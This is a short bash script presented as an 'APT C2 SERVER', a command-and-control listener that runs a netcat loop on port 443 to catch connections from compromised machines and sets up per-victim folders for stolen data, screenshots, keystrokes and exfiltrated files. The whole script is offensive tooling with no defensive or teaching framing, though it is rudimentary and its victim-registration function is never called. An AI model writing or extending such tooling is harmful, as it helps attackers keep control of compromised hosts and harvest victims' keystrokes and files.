#!/bin/bash

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

C2_PORT=443
VICTIM_DIR="$HOME/c2_server/victims"
LOG_DIR="$HOME/c2_server/logs"
CONFIG_DIR="$HOME/c2_server/config"

mkdir -p "$VICTIM_DIR" "$LOG_DIR" "$CONFIG_DIR"

# Initialize counters
[ ! -f "$CONFIG_DIR/victim_counter" ] && echo 0 > "$CONFIG_DIR/victim_counter"

banner() {
    clear
    echo -e "${RED}"
    echo "╔══════════════════════════════════════╗"
    echo "║     💀 APT C2 SERVER v2.0           ║"
    echo "║     Real TCP Handler — No Fake      ║"
    echo "╚══════════════════════════════════════╝"
    echo -e "${NC}"
}

# Register Real Victim
register_real_victim() {
    local ip="$1"
    local counter=$(cat "$CONFIG_DIR/victim_counter")
    counter=$((counter + 1))
    echo $counter > "$CONFIG_DIR/victim_counter"
    
    local victim_id=$(printf "VICTIM-%03d" $counter)
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    mkdir -p "$VICTIM_DIR/$victim_id"/{data,screenshots,keystrokes,exfiltrated,logs}
    
    cat > "$VICTIM_DIR/$victim_id/info.json" << INFO
{
  "id": "$victim_id",
  "ip": "$ip",
  "first_seen": "$timestamp",
  "last_seen": "$timestamp",
  "status": "online",
  "risk_score": "green",
  "sessions": 1
}
INFO
    
    echo "[$timestamp] REGISTER | $victim_id | $ip" >> "$LOG_DIR/real_victims.log"
    echo -e "\n${GREEN}[+] REAL VICTIM CONNECTED: $victim_id${NC}"
    echo -e "    IP: $ip | Time: $timestamp"
    
    echo "$victim_id"
}

# The Real TCP Handler
tcp_handler() {
    echo -e "${GREEN}[+]${NC} TCP Listener started on 0.0.0.0:$C2_PORT"
    echo -e "${YELLOW}[*]${NC} Waiting for REAL connections...\n"
    
    while true; do
        # Accept connection
        nc -lvnp $C2_PORT 2>/dev/null
    done
}

# Start
banner
tcp_handler
